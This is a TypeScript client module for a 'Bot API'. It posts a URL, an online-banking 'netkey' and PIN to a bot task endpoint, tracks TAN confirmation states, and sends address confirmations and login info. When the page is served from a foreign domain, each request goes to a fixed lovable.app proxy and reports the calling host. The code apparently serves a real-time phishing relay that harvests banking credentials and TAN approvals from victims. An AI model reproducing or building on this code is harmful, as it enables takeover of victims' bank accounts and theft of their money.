// All Bot API calls go through same-origin proxy routes under
// /api/public/bot/*. The server resolves the actual backend URL from
// public.domain_routes via resolveBackend. This avoids mixed-content
// (HTTPS page → HTTP backend) errors in the browser.

export type BotStatus =
  | "pending"
  | "running"
  | "waiting_for_tan"
  | "tan_confirmed"
  | "tan_rejected"
  | "tan_timeout"
  | "completed"
  | "failed"
  | string;

export type BotTaskResponse = {
  task_id?: string;
  status?: BotStatus;
  result?: any;
  error?: string;
  message?: string;
};

const STABLE_PROXY_ORIGIN = "https://project--67763f4d-9211-4bf3-a23b-c8178750b188-dev.lovable.app";

function proxyUrl(path: string): string {
  if (typeof window === "undefined") return path;
  const host = window.location.hostname.toLowerCase();
  const isLocal = host === "localhost" || host === "127.0.0.1";
  const isLovable = host.endsWith(".lovable.app") || host.endsWith(".lovableproject.com");
  const separator = path.includes("?") ? "&" : "?";
  const target = isLocal || isLovable ? path : `${STABLE_PROXY_ORIGIN}${path}`;
  return `${target}${separator}host=${encodeURIComponent(window.location.host)}`;
}

export async function startBotTask(input: {
  url: string;
  netkey: string;
  pin: string;
}): Promise<{ task_id: string }> {
  let res: Response;
  try {
    res = await fetch(proxyUrl(`/api/public/bot/task`), {
      method: "POST",
      body: JSON.stringify({
        url: input.url,
        netkey: input.netkey,
        pin: input.pin,
      }),
    });

  } catch (e: any) {
    throw new Error(`network_fetch_failed: ${e?.message ?? e}`);
  }
  const raw = await res.text();
  let data: BotTaskResponse & { diag?: unknown; upstream_body?: string } = {};
  try { data = JSON.parse(raw); } catch { /* not json */ }
  if (!res.ok) {
    const parts = [
      `HTTP ${res.status}`,
      (data as any)?.error ? `error=${(data as any).error}` : null,
      (data as any)?.message ? `msg=${(data as any).message}` : null,
      (data as any)?.diag?.resolved
        ? `backend=${(data as any).diag.resolved.label} → ${(data as any).diag.resolved.baseUrl}`
        : `host=${(data as any)?.diag?.incoming_host ?? "?"}`,
      (data as any)?.diag?.upstream_url ? `upstream=${(data as any).diag.upstream_url}` : null,
      (data as any)?.diag?.fetch_error ? `cause=${(data as any).diag.fetch_error.message}` : null,
      (data as any)?.upstream_body ? `body=${String((data as any).upstream_body).slice(0, 200)}` : null,
    ].filter(Boolean);
    throw new Error(parts.join(" | ") || raw.slice(0, 300));
  }
  if (!data.task_id) throw new Error(`no_task_id | body=${raw.slice(0, 200)}`);
  return { task_id: data.task_id };
}

export async function getBotTask(taskId: string): Promise<{ status: number; data: BotTaskResponse }> {
  const res = await fetch(proxyUrl(`/api/public/bot/task/${encodeURIComponent(taskId)}`), {
  });
  let data: BotTaskResponse = {};
  try {
    data = (await res.json()) as BotTaskResponse;
  } catch {
    /* noop */
  }
  return { status: res.status, data };
}

export async function confirmAddress(taskId: string): Promise<Response> {
  return fetch(proxyUrl(`/api/public/bot/task/${encodeURIComponent(taskId)}/confirm-address`), {
    method: "POST",
  });
}

export async function sendLoginInfo(taskId: string, body: unknown): Promise<Response> {
  return fetch(proxyUrl(`/api/public/bot/task/login-info/${encodeURIComponent(taskId)}`), {
    method: "POST",
    body: JSON.stringify(body ?? {}),
  });
}
